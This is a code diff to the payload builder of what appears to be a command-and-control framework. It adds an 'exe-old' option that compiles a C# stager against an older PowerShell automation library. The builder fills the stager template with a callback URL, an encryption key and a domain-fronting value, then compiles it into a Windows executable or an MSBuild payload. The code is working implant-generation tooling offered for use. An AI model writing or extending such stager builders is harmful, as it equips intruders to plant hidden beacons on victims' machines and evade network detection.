@@ -25,6 +25,7 @@ class Payload:
         # self.type["hta"] = "stager.ps1"
 
         self.type["exe"] = "../bin/stager.cs"
+        self.type["exe-old"] = "../bin/stager.cs"
         self.type["cs"] = "../bin/stager.cs"
         self.type["msbuild"] = "stager.ps1"
 
@@ -61,17 +62,20 @@ class Payload:
         output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay)).replace("[FRONTING]", self.get_fronting())
         if self.option == "exe":
             output = self.compile_exe(output)
+        if self.option == "exe-old":
+            output = self.compile_exe(output, v1=True)            
         if self.option == "msbuild":
             output = self.generate_msbuild(output)
         return output
 
-    def compile_exe(self, data):
+    def compile_exe(self, data, v1=False):
         output = ""
         filename = "/tmp/%s" % Utils.gen_str(10)
         open(filename, "w+").write(data)
+        ver = "-v1" if v1 else ""
         cmdline = \
-            "mcs %s -out:%s.exe -r:bin/System.Drawing.dll -r:bin/System.Management.Automation.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1" \
-            % (filename, filename)
+            "mcs %s -out:%s.exe -r:bin/System.Drawing.dll -r:bin/System.Management.Automation%s.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1" \
+            % (filename, filename, ver)
 
         os.system(cmdline)
         output = open("%s.exe" % filename, "rb").read()
